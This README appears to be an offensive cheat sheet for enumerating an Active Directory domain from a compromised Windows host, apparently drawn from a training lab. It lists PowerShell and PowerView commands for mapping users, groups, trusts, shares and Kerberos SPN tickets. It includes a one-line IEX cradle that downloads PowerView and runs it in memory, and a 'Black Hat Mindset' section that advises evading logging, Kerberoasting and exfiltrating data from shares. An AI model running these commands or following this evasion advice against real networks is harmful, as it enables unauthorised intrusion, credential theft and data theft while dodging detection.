# Active Directory Internal Enumeration

This README is designed to help you explore and enumerate AD environments on Windows-based hosts, uncovering critical information for privilege escalation, lateral movement, or persistence.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [PowerShell AD Cmdlets](#powershell-ad-cmdlets)
- [Scripts](#scripts)
- [Additional Tools](#additional-tools)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

This guide covers commands and scripts to enumerate AD domains, users, groups, trusts, and more from a compromised Windows host. Whether you're testing defenses or learning AD exploitation, these techniques will help you map the network and find exploitable misconfigurations. All commands assume you have appropriate access (e.g., domain user or admin rights) and are executed in PowerShell or Command Prompt.

## Setup and Prerequisites

- **Environment**: A Windows-based host with AD module or PowerView installed.
- **PowerShell**: Open PowerShell with administrative privileges (right-click > "Run as Administrator").
- **AD Module**: Install the Active Directory module if not present (e.g., on a domain-joined machine or via RSAT tools).
- **PowerView**: Download PowerView (e.g., from PowerSploit) and load it into memory (e.g., `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`).
- **Tools**: Ensure tools like Snaffler are available in your working directory (e.g., `C:\Tools\`).

## PowerShell AD Cmdlets

These native PowerShell cmdlets require the Active Directory module. Load it with `Import-Module ActiveDirectory` before use.

```powershell
Get-Module                   # Lists all loaded PowerShell modules to verify the AD module is available
Import-Module ActiveDirectory # Loads the Active Directory PowerShell module for AD commands
Get-ADDomain                 # Retrieves detailed information about the current Windows domain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName  # Enumerates user accounts with SPNs
Get-ADTrust -Filter *        # Lists all trust relationships in the target Windows domain
Get-ADGroup -Filter * | select name  # Enumerates all groups in the domain and displays their names
Get-ADGroup -Identity "Backup Operators"  # Searches for a specific group
Get-ADGroupMember -Identity "Backup Operators"  # Discovers members of a specific group
```

## Scripts

PowerView is a powerful AD enumeration tool. Load it into memory and run these scripts to gather detailed domain information.

```powershell
Export-PowerViewCSV          # Appends enumeration results to a CSV file for later analysis
ConvertTo-SID               # Converts a user or group name to its Security Identifier (SID)
Get-DomainSPNTicket        # Requests a Kerberos ticket for a specified SPN
Get-Domain                  # Returns the AD object for the current or specified domain
Get-DomainController       # Lists all domain controllers for the target domain
Get-DomainUser             # Returns all users or specific user objects in AD
Get-DomainComputer         # Returns all computers or specific computer objects in AD
Get-DomainGroup            # Returns all groups or specific group objects in AD
Get-DomainOU               # Searches for all or specific Organizational Unit objects
Find-InterestingDomainAcl  # Identifies domain object ACLs with modification rights
Get-DomainGroupMember      # Returns members of a specific domain group
Get-DomainFileServer       # Lists servers likely functioning as file servers
Get-DomainDFSShare         # Returns all DFS shares for the current domain
Get-DomainGPO              # Returns all Group Policy Objects
Get-DomainPolicy           # Retrieves the default domain policy
Get-NetLocalGroup          # Enumerates local groups on machines
Get-NetLocalGroupMember    # Enumerates members of a specific local group
Get-NetShare               # Lists open shares on machines
Get-NetSession             # Returns session information
Test-AdminAccess           # Tests if current user has administrative access
Find-DomainUserLocation    # Identifies machines where specific users are logged in
Find-DomainShare           # Discovers reachable shares on domain machines
Find-InterestingDomainShareFile  # Searches readable shares for sensitive files
Find-LocalAdminAccess      # Finds machines where current user has admin access
Get-DomainTrust            # Returns domain trusts
Get-ForestTrust            # Returns all forest trusts
Get-DomainForeignUser      # Enumerates users in groups outside their domain
Get-DomainForeignGroupMember  # Enumerates groups with foreign members
Get-DomainTrustMapping     # Enumerates all trusts for the current domain
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # Lists all Domain Admins members
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  # Finds users with SPNs
```

## Additional Tools

Beyond PowerShell and PowerView, these tools enhance AD enumeration.

```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data  # Runs Snaffler to find sensitive data
```

## Black Hat Mindset

- **Be Thorough**: Enumerate every user, group, and trust to uncover hidden privileges or misconfigurations.
- **Stay Undetected**: Use in-memory execution for PowerView and avoid writing files to disk to evade logging.
- **Exploit Opportunities**: Target SPNs for Kerberoasting, weak ACLs for privilege escalation, or open shares for data exfiltration.
- **Plan Ahead**: Map the domain trust relationships and GPOs to identify next steps for lateral movement.

## Resources

- Active Directory Basics
- PowerView Documentation
- Snaffler GitHub
- Kerberoasting Guide
- AD Enumeration Cheatsheet

